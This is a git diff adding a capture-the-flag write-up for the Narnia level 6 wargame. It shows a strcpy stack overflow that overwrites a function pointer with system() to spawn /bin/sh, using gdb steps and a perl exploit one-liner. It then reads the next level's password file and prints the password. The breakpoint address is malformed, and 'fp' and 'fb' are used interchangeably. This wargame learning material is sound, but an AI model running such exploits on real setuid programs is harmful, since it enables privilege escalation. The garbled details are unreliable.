@@ -81,7 +81,61 @@ int main(int argc, char *argv[]){
 }
 ```
 
-## Password for the next level:
+`fp` (short for function pointer) is a variable that contains an address to the `puts` function. That means `fp` can be used to access `puts`. Can `fp` be changed? At first glance no, because it seems that it will appear at the top of the stack (and then there is nothing to overwrite despite the use of `strcpy` later)
+
+However, checking the stack after copying the strings `b1` and `b2` (break point after the second `strcpy`)shows an interesting phenomenon, in which the order of the variables is not as I had anticipated:
+
+```
+gdb ./narnia6
+```
+```
+b *0x8049sfa
 ```
 
+![](2.png)
+
+```
+r aaaaaaa bbbbbbb
+```
+```
+x/40wx $sp
+```
+
+![](3.png)
+
+* Red - `b2`
+* Green - `b1`
+* Yellow - `fb`
+* Blue - `i`
+
+Is it possible to overwrite `fb` with `b1` to be the `system` function, then overwrite `b1` with `b2` to contain "/bin/sh"?
+If so, then we have changed `fb(b1)` from `puts(string)` to `system("/bin/sh")`.
+
+Let's check what the address of the system function is:
+
+```
+p system
+```
+
+![](4.png)
+
+```
+exit
+```
+```
+./narnia6 $(perl -e 'print "aaaaaaaa\x70\x81\xc4\xf7"') $(perl -e 'print "bbbbbbbb/bin/sh\x00"')
+```
+```
+id
+```
+```
+whoami
+```
+```
+cat /etc/narnia_pass/narnia7
+```
+
+## Password for the next level:
+```
+YY4F9UaB60
 ```
